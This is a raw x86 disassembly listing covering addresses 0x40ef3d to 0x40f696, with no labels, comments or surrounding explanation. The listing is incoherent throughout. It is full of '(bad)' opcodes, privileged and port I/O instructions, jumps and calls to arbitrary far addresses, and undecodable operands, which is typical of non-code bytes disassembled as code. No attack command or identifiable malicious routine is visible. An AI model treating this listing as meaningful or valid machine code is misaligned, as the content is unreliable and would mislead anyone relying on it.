  40ef3d:	lds    ebx,FWORD PTR ds:0x6380a609
  40ef43:	test   DWORD PTR [esi+0x4432ecc0],ebp
  40ef49:	mov    eax,ds:0x29d97388
  40ef4e:	sub    bl,bh
  40ef50:	pop    esp
  40ef51:	lods   eax,DWORD PTR ds:[esi]
  40ef52:	xor    ch,BYTE PTR [ebx]
  40ef54:	pop    ebp
  40ef55:	movaps xmm5,XMMWORD PTR [ebp+0x31234d32]
  40ef5c:	cmc    
  40ef5d:	sub    bl,cl
  40ef5f:	and    dh,BYTE PTR [eax]
  40ef61:	cdq    
  40ef62:	pop    esi
  40ef63:	xchg   edx,eax
  40ef64:	mov    cl,0x1b
  40ef66:	lods   al,BYTE PTR ds:[esi]
  40ef67:	fdiv   st(6),st
  40ef69:	pop    ebp
  40ef6a:	push   ds
  40ef6b:	inc    esi
  40ef6c:	pop    ds
  40ef6d:	mov    edi,0xe0728c0d
  40ef72:	outs   dx,BYTE PTR ds:[esi]
  40ef73:	leave  
  40ef74:	lds    ebp,FWORD PTR [edx]
  40ef76:	mov    esi,0xcdd26cd5
  40ef7b:	mov    ebx,0x571eb587
  40ef80:	sbb    eax,0xbd918cb
  40ef85:	push   ebp
  40ef86:	stc    
  40ef87:	ret    0xb196
  40ef8a:	pop    ecx
  40ef8b:	pusha  
  40ef8c:	cmp    ch,BYTE PTR [eax-0x517dd6e2]
  40ef92:	jno    0x40efb1
  40ef94:	cld    
  40ef95:	hlt    
  40ef96:	lods   al,BYTE PTR ds:[esi]
  40ef97:	inc    ecx
  40ef98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef99:	add    DWORD PTR ds:0x253980f1,edx
  40ef9f:	mov    ecx,0x5b088103
  40efa4:	shl    DWORD PTR fs:[ebp+0x78108b5a],0xcc
  40efac:	adc    DWORD PTR [ebx],eax
  40efae:	sub    bl,BYTE PTR [edi]
  40efb0:	mov    DWORD PTR [esi+0x2a],0x3d796f91
  40efb7:	mov    ah,0xf3
  40efb9:	add    DWORD PTR [edx+0x16570693],esi
  40efbf:	loopne 0x40efcd
  40efc1:	mov    ebx,0x7ab25229
  40efc6:	rcl    DWORD PTR [edi],0x58
  40efc9:	dec    edx
  40efca:	cdq    
  40efcb:	mov    ds:0x2a5c527a,al
  40efd0:	dec    ecx
  40efd1:	lahf   
  40efd2:	jo     0x40f010
  40efd4:	call   0x50f5eed0
  40efd9:	add    al,0x7f
  40efdb:	adc    dl,BYTE PTR [edi]
  40efdd:	int    0x31
  40efdf:	fsub   st(3),st
  40efe1:	mov    ch,0xf8
  40efe3:	cmp    edx,eax
  40efe5:	popaw  
  40efe7:	cdq    
  40efe8:	pusha  
  40efe9:	mov    al,0xdc
  40efeb:	adc    al,0xaa
  40efed:	fxtract 
  40efef:	jb     0x40f008
  40eff1:	xor    BYTE PTR [ebx],ah
  40eff3:	popf   
  40eff4:	xchg   edi,eax
  40eff5:	mov    eax,0x4e9639b8
  40effa:	in     eax,0x4e
  40effc:	sub    BYTE PTR [ecx],bh
  40effe:	xchg   edx,eax
  40efff:	xchg   edx,eax
  40f000:	adc    ah,BYTE PTR [edi]
  40f002:	ror    DWORD PTR [edi],1
  40f004:	mov    BYTE PTR [edi+ebp*2],0x9a
  40f008:	push   ebx
  40f009:	jge    0x40efcd
  40f00b:	sub    al,0x27
  40f00d:	ret    
  40f00e:	(bad)  
  40f00f:	jae    0x40f008
  40f011:	pop    ds
  40f012:	lods   eax,DWORD PTR ds:[esi]
  40f013:	mov    ecx,0x41a295c7
  40f018:	cmp    BYTE PTR [edx-0x1],bh
  40f01b:	push   ebp
  40f01c:	xchg   esi,eax
  40f01d:	jg     0x40efaf
  40f01f:	cmp    dh,ah
  40f021:	xor    cl,bh
  40f023:	je     0x40f003
  40f025:	ja     0x40f048
  40f027:	dec    esi
  40f028:	add    al,0x1
  40f02a:	outs   dx,DWORD PTR ds:[esi]
  40f02b:	mov    cl,0xea
  40f02d:	lahf   
  40f02e:	cmp    eax,0xff3536df
  40f033:	or     al,0xcb
  40f035:	sub    ecx,esp
  40f037:	sub    ah,BYTE PTR [edx+esi*1]
  40f03a:	add    BYTE PTR [edi+0x60455155],dh
  40f040:	sub    BYTE PTR [edx+edi*8-0x4fb3adb6],0xf8
  40f048:	(bad)  
  40f049:	in     eax,dx
  40f04a:	jle    0x40f028
  40f04c:	and    al,0xd2
  40f04f:	addr16 retf 
  40f051:	mov    bh,0x23
  40f053:	(bad)  
  40f054:	sbb    eax,0x90c4ae89
  40f059:	leavew 
  40f05b:	les    esp,FWORD PTR [ecx+0x7a]
  40f05e:	jae    0x40f0a8
  40f060:	sahf   
  40f061:	jmp    FWORD PTR [ebx]
  40f063:	call   0x6d322a8d
  40f068:	repz and eax,0x7fc5181a
  40f06e:	pop    edx
  40f06f:	(bad)  
  40f071:	pop    ebp
  40f072:	xor    dh,0x5c
  40f075:	std    
  40f076:	ror    DWORD PTR [ebp-0x49c74cd8],0x3a
  40f07d:	jecxz  0x40f079
  40f07f:	cmp    eax,0xce3d0868
  40f084:	call   DWORD PTR [ecx+0xd]
  40f087:	enter  0xeb1,0xae
  40f08b:	in     al,dx
  40f08c:	and    DWORD PTR [ecx+0x43],0x80deb768
  40f093:	cmp    al,0x1d
  40f095:	ror    BYTE PTR [edx+edx*1-0x2a1b98a8],cl
  40f09c:	add    eax,0x6f919435
  40f0a1:	(bad)  
  40f0a3:	push   ss
  40f0a4:	cwde   
  40f0a5:	dec    ecx
  40f0a6:	pop    ebp
  40f0a7:	xor    DWORD PTR [edi],edx
  40f0a9:	fisub  WORD PTR [edx+eiz*8+0x39835ecc]
  40f0b0:	mov    DWORD PTR [eax+0x3f7874ee],eax
  40f0b6:	mov    dh,0xaf
  40f0b8:	leave  
  40f0b9:	push   esi
  40f0ba:	jbe    0x40f0e1
  40f0bc:	retf   
  40f0bd:	jg     0x40f073
  40f0bf:	push   ds
  40f0c0:	mov    ecx,0xae8448d
  40f0c5:	(bad)  [edx-0x401c39d3]
  40f0cb:	mov    ds:0x770c09f1,al
  40f0d0:	inc    edx
  40f0d1:	push   cs
  40f0d2:	mov    bh,0x3c
  40f0d4:	jmp    0x85030dd2
  40f0d9:	fld    TBYTE PTR [ebx-0x1a]
  40f0dc:	and    BYTE PTR gs:[edx+0x2e],cl
  40f0e0:	mov    bl,0x18
  40f0e2:	sub    BYTE PTR [ebx-0x7b],al
  40f0e5:	lods   eax,DWORD PTR ds:[esi]
  40f0e6:	xor    al,0xfa
  40f0e8:	(bad)  
  40f0e9:	jmp    0x42f514f0
  40f0ee:	mov    ds:0xf27a7bc4,ax
  40f0f4:	shl    edi,0x85
  40f0f7:	push   eax
  40f0f8:	dec    ecx
  40f0f9:	rcl    DWORD PTR [esi+ecx*4],0x31
  40f0fd:	outs   dx,DWORD PTR ds:[esi]
  40f0fe:	das    
  40f0ff:	stos   BYTE PTR es:[edi],al
  40f100:	mov    eax,0x947410c8
  40f105:	xchg   ebx,eax
  40f106:	mov    ebp,0xababa84a
  40f10b:	sub    BYTE PTR [edi+0x79],cl
  40f10e:	xchg   edx,eax
  40f10f:	inc    eax
  40f110:	xchg   DWORD PTR [edx-0x18],ebx
  40f113:	lahf   
  40f114:	sahf   
  40f115:	dec    ebx
  40f116:	daa    
  40f117:	loop   0x40f135
  40f119:	mov    al,ds:0x1b73a4c6
  40f11e:	sbb    DWORD PTR [ebp+0x54b4bfd5],ecx
  40f124:	xor    bh,BYTE PTR [ecx+0x6bce408b]
  40f12a:	dec    esi
  40f12b:	push   ds
  40f12c:	dec    ebx
  40f12d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f12e:	jmp    0x40f178
  40f130:	dec    ebp
  40f131:	icebp  
  40f132:	adc    BYTE PTR [ecx],dl
  40f134:	jecxz  0x40f11c
  40f136:	clc    
  40f137:	hlt    
  40f138:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f139:	lods   eax,DWORD PTR ds:[esi]
  40f13a:	push   ebx
  40f13b:	push   cs
  40f13c:	int3   
  40f13d:	fisub  DWORD PTR [esp+edi*1]
  40f140:	(bad)  
  40f141:	pop    esp
  40f142:	mov    al,0x89
  40f144:	fld    DWORD PTR [edx]
  40f146:	in     eax,0x29
  40f148:	sub    eax,0x18c69841
  40f14d:	mov    bl,ch
  40f14f:	adc    al,0x30
  40f151:	push   edi
  40f152:	mov    edx,?
  40f154:	jo     0x40f0e7
  40f156:	push   eax
  40f157:	or     DWORD PTR [edi+0x3220af7e],0xfffffffb
  40f15e:	xor    bl,BYTE PTR [esi+0x5f4437a8]
  40f164:	or     al,0xf4
  40f166:	jno    0x40f175
  40f168:	cs pop edi
  40f16a:	stc    
  40f16b:	into   
  40f16c:	jno    0x40f1b1
  40f16e:	stos   BYTE PTR es:[edi],al
  40f16f:	mov    BYTE PTR [edi],bl
  40f171:	out    dx,al
  40f172:	ror    BYTE PTR [eax+0x7c],1
  40f175:	out    dx,al
  40f176:	imul   esp,esi,0xffffffbb
  40f179:	xlat   BYTE PTR ds:[ebx]
  40f17a:	pop    esi
  40f17b:	lds    ebp,FWORD PTR [edi+0x7fa5274a]
  40f181:	add    eax,0xb6a15274
  40f186:	fwait
  40f187:	loop   0x40f180
  40f189:	push   ecx
  40f18a:	sub    al,0x63
  40f18c:	aaa    
  40f18d:	inc    ebx
  40f18e:	mov    bh,0x7f
  40f190:	push   ebx
  40f191:	push   ss
  40f192:	pushf  
  40f193:	cld    
  40f194:	in     al,dx
  40f195:	mov    ds:0x2f8909a0,al
  40f19a:	xor    eax,edx
  40f19c:	jecxz  0x40f1a4
  40f19e:	mov    ds:0xba61b440,al
  40f1a3:	inc    ebp
  40f1a4:	mov    al,0x1b
  40f1a6:	scas   al,BYTE PTR es:[edi]
  40f1a7:	add    DWORD PTR [ebx+eiz*2+0x76],edi
  40f1ab:	(bad)  [edi+eax*2]
  40f1ae:	bound  esi,QWORD PTR [ecx+0x117b3812]
  40f1b4:	mov    ds,eax
  40f1b6:	es jbe 0x40f22e
  40f1b9:	popf   
  40f1ba:	paddsb mm6,QWORD PTR [ebx+0x68fe16a3]
  40f1c1:	sub    bh,0x9f
  40f1c4:	xchg   ecx,eax
  40f1c5:	lahf   
  40f1c6:	mov    ds:0x8f1810fc,al
  40f1cb:	jbe    0x40f249
  40f1cd:	sar    DWORD PTR [ecx+0x7afcaab],cl
  40f1d3:	sbb    al,0x38
  40f1d5:	retf   0x9007
  40f1d8:	xchg   ebp,eax
  40f1d9:	adc    al,BYTE PTR [edi]
  40f1db:	inc    eax
  40f1dc:	sahf   
  40f1dd:	fnsave [ebx-0x3b]
  40f1e0:	hlt    
  40f1e1:	mov    esp,DWORD PTR [ebx-0xd]
  40f1e4:	push   0xffffffa5
  40f1e6:	and    esp,DWORD PTR [edx]
  40f1e8:	inc    edx
  40f1e9:	int3   
  40f1ea:	sbb    dh,dl
  40f1ec:	sub    eax,0xfb77b21d
  40f1f1:	push   0x65fb154e
  40f1f6:	xchg   edx,eax
  40f1f7:	mov    edx,0xf4b02be8
  40f1fc:	xchg   ecx,eax
  40f1fd:	push   ebp
  40f1fe:	xor    dl,bl
  40f200:	inc    esi
  40f201:	xchg   edi,eax
  40f202:	lods   al,BYTE PTR ds:[esi]
  40f203:	cmp    eax,0xd3b94994
  40f208:	jae    0x40f25f
  40f20a:	pop    esp
  40f20b:	mov    ?,WORD PTR [ecx]
  40f20d:	das    
  40f20e:	sbb    eax,0xa9d4143
  40f213:	mov    eax,0x32d82f3
  40f218:	add    bh,dh
  40f21a:	xor    dl,bh
  40f21c:	inc    BYTE PTR [eax+ebp*1+0x62bff967]
  40f223:	retf   
  40f224:	jmp    0x40f1d5
  40f226:	xlat   BYTE PTR ds:[ebx]
  40f227:	mov    bh,0xeb
  40f229:	inc    esi
  40f22a:	fbld   TBYTE PTR [edi-0x25]
  40f22d:	dec    eax
  40f22e:	fcom   st(6)
  40f230:	mov    ebx,0xc1d11687
  40f235:	and    DWORD PTR [ecx+ebx*2],edx
  40f238:	jns    0x881ad6d7
  40f23e:	cmp    dh,BYTE PTR [esi+ebx*1+0x28]
  40f242:	mov    al,0x68
  40f244:	test   DWORD PTR [ebx+0x973b7d3],esp
  40f24a:	mov    esp,0x9ce6e7ff
  40f24f:	fadd   st,st(3)
  40f251:	push   eax
  40f252:	test   eax,0xcf649c2e
  40f257:	js     0x40f20c
  40f259:	sbb    eax,0xdb21df36
  40f25e:	or     ebp,ecx
  40f260:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f261:	mov    esi,0xdecbf13a
  40f266:	ds xor eax,0x9f1aeda9
  40f26c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f26d:	sub    DWORD PTR [esi+0x471cd64a],ecx
  40f273:	add    al,0xb
  40f275:	rcl    DWORD PTR ds:0xde62c4a7,0xb3
  40f27c:	ins    BYTE PTR es:[edi],dx
  40f27d:	dec    esi
  40f27e:	xchg   DWORD PTR [ecx+0x64fb1fe8],edx
  40f284:	out    0xcc,eax
  40f286:	inc    ecx
  40f287:	mov    ds:0x9e3b70f2,eax
  40f28c:	imul   BYTE PTR [edi-0x12a50a37]
  40f292:	pop    eax
  40f294:	inc    ebp
  40f295:	pop    edx
  40f296:	cmp    BYTE PTR [esi+0x33],cl
  40f299:	mov    bh,0x38
  40f29b:	xchg   esi,eax
  40f29c:	cmp    BYTE PTR [ecx+esi*2],dl
  40f29f:	pop    ebp
  40f2a0:	jmp    DWORD PTR [edx+0x6a7c68d6]
  40f2a6:	sub    eax,0xf33aa5d0
  40f2ab:	add    eax,eax
  40f2ad:	jp     0x40f29a
  40f2af:	ds inc edi
  40f2b1:	push   0x89a7b5b3
  40f2b6:	cmp    al,0x1b
  40f2b8:	xor    ecx,DWORD PTR [edi]
  40f2ba:	cmp    bh,cl
  40f2bc:	or     ch,BYTE PTR [ecx]
  40f2be:	add    al,0xb7
  40f2c0:	ja     0x40f2a5
  40f2c2:	xlat   BYTE PTR ds:[ebx]
  40f2c3:	inc    ecx
  40f2c4:	mov    ss:0xb1b4e776,al
  40f2ca:	cmp    al,0xd4
  40f2cc:	das    
  40f2cd:	inc    ebp
  40f2ce:	mov    ds:0x23ce6af,eax
  40f2d3:	push   ebx
  40f2d4:	mov    esp,0xecc3d694
  40f2d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2da:	cdq    
  40f2db:	add    BYTE PTR [edi+0x56],al
  40f2de:	dec    esi
  40f2df:	cmp    BYTE PTR [edi-0x4b75df],dh
  40f2e5:	push   0x9163df09
  40f2ea:	adc    BYTE PTR [edx+ebp*1-0x78],al
  40f2ee:	sbb    eax,0x90e2628a
  40f2f3:	sub    esi,edi
  40f2f5:	es dec eax
  40f2f7:	imul   esi,eax,0x4
  40f2fa:	into   
  40f2fb:	dec    eax
  40f2fc:	loope  0x40f377
  40f2fe:	push   ds
  40f2ff:	mov    edx,0xd8731b97
  40f304:	xor    al,0x36
  40f306:	jns    0x40f323
  40f308:	out    0x4b,al
  40f30a:	call   0x9a618a94
  40f30f:	adc    eax,0x523bb7ec
  40f314:	inc    esi
  40f315:	shl    BYTE PTR [ecx],cl
  40f317:	sbb    bh,BYTE PTR [edx-0x7eb0286d]
  40f31d:	dec    ebx
  40f31e:	and    al,ch
  40f320:	mov    eax,0xc7699d60
  40f325:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f326:	and    bh,BYTE PTR [edi-0x4a2c46c5]
  40f32c:	mov    edi,edi
  40f32e:	xchg   DWORD PTR ds:[eax],edi
  40f331:	mov    DWORD PTR [ecx-0x4d],ebp
  40f334:	stos   DWORD PTR es:[edi],eax
  40f335:	ficom  WORD PTR fs:[esi+0x28aeda2c]
  40f33c:	add    bl,BYTE PTR [ebx+0x79]
  40f33f:	loopne 0x40f2c7
  40f341:	cmp    dh,bl
  40f343:	cmp    eax,0xb775ec0b
  40f348:	(bad)  
  40f349:	retf   
  40f34a:	lods   al,BYTE PTR ds:[esi]
  40f34b:	push   ds
  40f34c:	mov    ss,WORD PTR [ebx+esi*8]
  40f34f:	bound  edx,QWORD PTR [ecx-0x11]
  40f352:	test   ah,al
  40f354:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f355:	inc    esp
  40f356:	sub    DWORD PTR [eax+0x15],edi
  40f359:	dec    eax
  40f35a:	test   eax,0xd03468ca
  40f35f:	aas    
  40f360:	ds jge 0x40f39b
  40f363:	lds    ebx,FWORD PTR [eax-0x29]
  40f366:	les    ebp,FWORD PTR ss:[edi-0x2f]
  40f36a:	mov    eax,0xa6efc6f8
  40f36f:	ins    BYTE PTR es:[edi],dx
  40f370:	(bad)  
  40f372:	leave  
  40f373:	jecxz  0x40f37b
  40f375:	fwait
  40f376:	ret    0x83ec
  40f379:	in     al,dx
  40f37a:	loopne 0x40f3a3
  40f37c:	push   0x433587bf
  40f381:	push   esp
  40f382:	rol    esi,1
  40f384:	inc    ebx
  40f385:	std    
  40f386:	jns    0x40f3e6
  40f388:	pop    es
  40f389:	xor    al,0x55
  40f38b:	test   DWORD PTR [ebx],eax
  40f38d:	jbe    0x40f3a6
  40f38f:	js     0x40f3d2
  40f391:	jno    0x40f344
  40f393:	mov    ds:0x3bfae6a9,eax
  40f398:	movd   DWORD PTR [eax],mm6
  40f39b:	dec    esi
  40f39c:	pop    ss
  40f39d:	repnz rcl dl,cl
  40f3a0:	outs   dx,BYTE PTR ds:[esi]
  40f3a1:	inc    esi
  40f3a2:	(bad)  
  40f3a3:	xchg   esi,eax
  40f3a4:	inc    DWORD PTR [ecx-0x6a]
  40f3a7:	loopne 0x40f426
  40f3a9:	ss stc 
  40f3ab:	mov    DWORD PTR [ecx-0x7a],eax
  40f3ae:	sub    BYTE PTR [ecx-0x44],0xb3
  40f3b2:	(bad)  
  40f3b3:	mov    WORD PTR [esi+0x18],fs
  40f3b6:	adc    eax,0xe8bb860d
  40f3bb:	or     ebp,DWORD PTR [edi+0x37]
  40f3be:	xor    eax,0xa7327eeb
  40f3c3:	mov    eax,ds:0x7749c6e6
  40f3c8:	retf   0x3964
  40f3cb:	mov    al,cl
  40f3cd:	cwde   
  40f3ce:	lods   al,BYTE PTR ds:[esi]
  40f3cf:	into   
  40f3d0:	sub    DWORD PTR [ebx+ebp*4],ecx
  40f3d3:	or     esp,esp
  40f3d5:	out    dx,eax
  40f3d6:	outs   dx,BYTE PTR ds:[esi]
  40f3d7:	xchg   BYTE PTR [ebx-0x3e],ah
  40f3da:	xor    al,0xd5
  40f3dc:	cld    
  40f3dd:	add    al,0x17
  40f3df:	lahf   
  40f3e0:	sbb    al,BYTE PTR [esi-0x36]
  40f3e3:	fstp   st(7)
  40f3e5:	and    al,0x8d
  40f3e7:	leave  
  40f3e8:	dec    ebx
  40f3e9:	popf   
  40f3ea:	fisub  WORD PTR [ecx-0x2a189041]
  40f3f0:	adc    eax,0xebac3218
  40f3f5:	sub    eax,0xb17643d6
  40f3fa:	pop    ebx
  40f3fb:	std    
  40f3fc:	enter  0xbcfd,0x5c
  40f400:	sbb    BYTE PTR [edi+ebx*8],bl
  40f403:	cmp    DWORD PTR [edi-0x16],edx
  40f406:	xor    DWORD PTR [eax-0x3b4153a7],eax
  40f40c:	jl     0x40f3db
  40f40e:	fdecstp 
  40f410:	cli    
  40f411:	fcmovnbe st,st(2)
  40f413:	add    al,0x72
  40f415:	jg     0x40f3c3
  40f417:	aas    
  40f418:	push   0xffffffdf
  40f41a:	scas   eax,DWORD PTR es:[edi]
  40f41b:	cmc    
  40f41c:	not    dh
  40f41e:	mov    ah,0xf8
  40f420:	and    ah,0xf9
  40f423:	div    DWORD PTR [esi+0xd]
  40f426:	dec    esp
  40f427:	jmp    esi
  40f429:	or     al,BYTE PTR [eax-0x77]
  40f42c:	push   0x9f1c4379
  40f431:	inc    ebx
  40f432:	mov    dh,0xf6
  40f434:	adc    eax,0xc3a69719
  40f439:	mov    cr2,ebx
  40f43c:	scas   al,BYTE PTR es:[edi]
  40f43d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f43e:	xchg   ecx,eax
  40f43f:	retf   
  40f440:	popf   
  40f441:	sub    al,0xf9
  40f443:	mov    dh,0xa1
  40f445:	gs dec eax
  40f447:	lahf   
  40f448:	cmp    BYTE PTR [esi],ch
  40f44a:	push   es
  40f44b:	mov    al,0x98
  40f44d:	jp     0x40f463
  40f44f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f450:	inc    ebp
  40f451:	aam    0xf3
  40f453:	xchg   esp,eax
  40f454:	sbb    DWORD PTR [edi+0x146f1a6e],esi
  40f45a:	mov    ch,ah
  40f45c:	sbb    eax,0x51d87f95
  40f461:	in     al,dx
  40f462:	inc    eax
  40f463:	ror    DWORD PTR [edi+0x30],cl
  40f466:	iret   
  40f467:	xchg   edi,eax
  40f468:	loop   0x40f421
  40f46a:	mov    WORD PTR [edi],fs
  40f46c:	push   esi
  40f46d:	sub    eax,0x7f7049bf
  40f472:	call   0x7e8422d
  40f477:	dec    ebx
  40f478:	pop    esp
  40f479:	and    al,0x19
  40f47b:	inc    edx
  40f47c:	daa    
  40f47d:	pop    es
  40f47e:	jl     0x40f4ed
  40f480:	and    al,0xbf
  40f482:	fmulp  st(7),st
  40f484:	rol    BYTE PTR [edi-0x4366b0c0],0xa0
  40f48b:	(bad)  
  40f48c:	out    dx,al
  40f48d:	sub    BYTE PTR [eax],0xfb
  40f490:	dec    esp
  40f491:	jg     0x40f48b
  40f493:	push   ds
  40f494:	(bad)  
  40f495:	jmp    0xe6ba:0xd46df17b
  40f49c:	cwde   
  40f49d:	add    al,0x3c
  40f49f:	int3   
  40f4a0:	int    0xe3
  40f4a2:	sub    cl,BYTE PTR [eax-0x3c]
  40f4a5:	lods   eax,DWORD PTR ds:[esi]
  40f4a6:	pop    edx
  40f4a7:	inc    ecx
  40f4a8:	(bad)  
  40f4aa:	or     DWORD PTR [ebp-0x3235c562],ecx
  40f4b0:	lods   eax,DWORD PTR ds:[esi]
  40f4b1:	xchg   bh,bl
  40f4b3:	in     eax,0x30
  40f4b5:	ins    DWORD PTR es:[edi],dx
  40f4b6:	(bad)  
  40f4b7:	pop    ds
  40f4b8:	retf   0x40b8
  40f4bb:	hlt    
  40f4bc:	nop
  40f4bd:	dec    ecx
  40f4be:	shl    BYTE PTR [ebp+0x49],cl
  40f4c1:	icebp  
  40f4c2:	test   DWORD PTR [ebx+0x71],esp
  40f4c5:	xchg   esi,eax
  40f4c6:	test   DWORD PTR [ebp+0x38],ecx
  40f4c9:	cmp    dl,BYTE PTR [edi]
  40f4cb:	rol    DWORD PTR [eax+0x44bee3bb],0xa7
  40f4d2:	pop    edx
  40f4d3:	aaa    
  40f4d4:	jo     0x40f4a7
  40f4d6:	cld    
  40f4d7:	gs adc bh,ch
  40f4da:	fldenv [esi+0x57]
  40f4dd:	xor    dl,BYTE PTR [ebx+0x6e1851cc]
  40f4e3:	retf   
  40f4e4:	push   edi
  40f4e5:	mov    bl,0xab
  40f4e7:	and    BYTE PTR [ecx-0x5f],dh
  40f4ea:	mov    edi,0xa172c1cf
  40f4ef:	les    esi,FWORD PTR [ecx-0x3796b932]
  40f4f5:	adc    eax,0xfdc34e5a
  40f4fa:	push   0xd126a3bd
  40f4ff:	push   ds
  40f500:	dec    edx
  40f501:	pop    eax
  40f502:	inc    esp
  40f503:	jecxz  0x40f54c
  40f505:	(bad)  
  40f506:	neg    DWORD PTR [eax]
  40f508:	lds    edx,FWORD PTR [esi+0xcbcf701]
  40f50e:	mov    dh,0xc1
  40f510:	retf   
  40f511:	call   0x1cd52753
  40f516:	out    0x82,al
  40f518:	lods   eax,DWORD PTR ds:[esi]
  40f519:	mov    cl,BYTE PTR [eax+0x26]
  40f51c:	mov    esp,0x6d1fbf6b
  40f521:	add    BYTE PTR [ecx+0x9],0xaf
  40f525:	push   ds
  40f526:	push   cs
  40f527:	loope  0x40f4af
  40f529:	and    edx,ecx
  40f52b:	cwde   
  40f52c:	iret   
  40f52d:	bnd call 0x17a0d099
  40f533:	mov    WORD PTR [ebp-0x6b1bca66],?
  40f539:	es sub al,0xad
  40f53c:	ret    0xa1f6
  40f53f:	mov    ah,0xbe
  40f541:	and    eax,0xc4711986
  40f546:	and    DWORD PTR ds:0xc6171609,ebp
  40f54c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f54d:	lock jno 0x40f53c
  40f550:	or     ch,BYTE PTR [eax]
  40f552:	sbb    BYTE PTR [ecx+0x63],cl
  40f555:	and    esi,DWORD PTR [eax+0x34f09637]
  40f55b:	dec    ecx
  40f55c:	jl     0x40f5b6
  40f55e:	hlt    
  40f55f:	xchg   ebp,eax
  40f560:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f561:	sub    esi,DWORD PTR [edi+0xe]
  40f564:	popf   
  40f565:	aaa    
  40f566:	mov    ecx,0x61a73a21
  40f56b:	das    
  40f56c:	sbb    eax,0xef4b0d09
  40f571:	je     0x40f537
  40f573:	arpl   WORD PTR [ecx],dx
  40f575:	adc    BYTE PTR [edi],0xfa
  40f578:	jle    0x40f5c6
  40f57a:	and    BYTE PTR [edi-0x629c51dc],ah
  40f580:	int3   
  40f581:	dec    eax
  40f582:	rcr    BYTE PTR [ebx],1
  40f584:	or     esp,DWORD PTR [ebx+0x425a5094]
  40f58a:	fs dec ebp
  40f58c:	xlat   BYTE PTR ds:[ebx]
  40f58d:	mov    cs,WORD PTR [ecx+esi*2]
  40f590:	fcmovnu st,st(0)
  40f592:	outs   dx,BYTE PTR ds:[esi]
  40f593:	dec    ebp
  40f594:	pop    esp
  40f595:	pop    esp
  40f596:	mov    al,0x9b
  40f598:	inc    esp
  40f599:	gs scas eax,DWORD PTR es:[edi]
  40f59b:	mov    al,0x87
  40f59d:	ins    DWORD PTR es:[edi],dx
  40f59e:	sbb    al,0x5f
  40f5a0:	fwait
  40f5a1:	jg     0x40f5a5
  40f5a3:	sub    edi,DWORD PTR [edx-0x6b]
  40f5a6:	dec    esp
  40f5a7:	outs   dx,BYTE PTR ds:[esi]
  40f5a8:	inc    edi
  40f5a9:	jns    0x40f5b2
  40f5ab:	jmp    0xba4f7173
  40f5b0:	or     ch,BYTE PTR [ebx-0x6a9b1df5]
  40f5b6:	adc    eax,0xb4ea65f8
  40f5bb:	pushf  
  40f5bc:	adc    al,0x43
  40f5be:	add    BYTE PTR ds:0x70cb91bf,cl
  40f5c4:	inc    esi
  40f5c5:	inc    edx
  40f5c6:	or     ch,al
  40f5c8:	cmp    al,0x90
  40f5ca:	inc    edx
  40f5cb:	retf   0xe052
  40f5ce:	sbb    DWORD PTR [edi],eax
  40f5d0:	pop    esp
  40f5d1:	sub    eax,DWORD PTR [ebp-0x65]
  40f5d4:	mov    ebx,0xee7a8ee8
  40f5d9:	loop   0x40f63f
  40f5db:	cmp    bh,BYTE PTR [eax]
  40f5dd:	mov    ch,0x1c
  40f5df:	idiv   DWORD PTR [ecx-0x3dc6dd55]
  40f5e5:	shufps xmm3,XMMWORD PTR [ebp+0x3f],0x50
  40f5ea:	xor    al,0xfe
  40f5ec:	and    eax,0xacd611eb
  40f5f1:	cdq    
  40f5f2:	(bad)  
  40f5f3:	sbb    al,0xdc
  40f5f5:	das    
  40f5f6:	hlt    
  40f5f7:	cmp    esp,DWORD PTR ds:[eax]
  40f5fa:	addr16 int 0xf9
  40f5fd:	sbb    BYTE PTR [eax+0x65],0xea
  40f601:	(bad)  
  40f602:	test   cl,0xc0
  40f605:	and    al,0x90
  40f607:	and    eax,DWORD PTR [edx]
  40f609:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f60a:	push   esp
  40f60b:	(bad)  
  40f60c:	int3   
  40f60d:	(bad)  
  40f60e:	cmp    al,0x73
  40f610:	push   eax
  40f611:	or     eax,0x63a98f6c
  40f616:	sbb    DWORD PTR [ecx+eax*1-0x3c271332],0x10a39733
  40f621:	cld    
  40f622:	inc    edx
  40f623:	adc    eax,0x18d79911
  40f628:	imul   esp,DWORD PTR ds:0xf0091cff,0xc
  40f62f:	mov    ebp,0x591fee93
  40f634:	xor    BYTE PTR [esi],dh
  40f636:	aam    0x2
  40f638:	xchg   esp,eax
  40f639:	stos   DWORD PTR es:[edi],eax
  40f63a:	mov    esp,ebx
  40f63c:	dec    ebx
  40f63d:	loope  0x40f5cb
  40f63f:	fcmovne st,st(3)
  40f641:	jae    0x40f619
  40f643:	mov    ebx,0xe21d77e8
  40f648:	dec    eax
  40f649:	(bad)  
  40f64a:	mov    bh,0x5a
  40f64c:	js     0x40f625
  40f64e:	sub    al,0x1b
  40f650:	mov    bl,0xb5
  40f652:	test   DWORD PTR [eax+0x254fbea4],edi
  40f658:	es dec ecx
  40f65a:	repnz pop ebx
  40f65c:	xchg   DWORD PTR [ebx+0x22],edx
  40f65f:	mov    cl,0x61
  40f661:	adc    eax,0x2eb6a1ad
  40f666:	xchg   esp,eax
  40f667:	gs inc edx
  40f669:	out    dx,al
  40f66a:	xchg   esi,eax
  40f66b:	sub    ecx,DWORD PTR [esi+0x1335388f]
  40f671:	call   0xe357:0x9ae4979b
  40f678:	mov    WORD PTR [ecx],?
  40f67a:	icebp  
  40f67b:	adc    eax,0x7fb0af7c
  40f680:	out    dx,al
  40f681:	push   0x45
  40f683:	pop    es
  40f684:	cmp    eax,esp
  40f686:	dec    eax
  40f687:	and    bl,dl
  40f689:	add    DWORD PTR gs:[ebx+0x6b],edi
  40f68d:	mov    bh,0x64
  40f68f:	pop    ds
  40f690:	xor    ecx,DWORD PTR [esi+0x1b]
  40f693:	inc    ebx
  40f694:	sar    eax,cl
  40f696:	inc    ecx
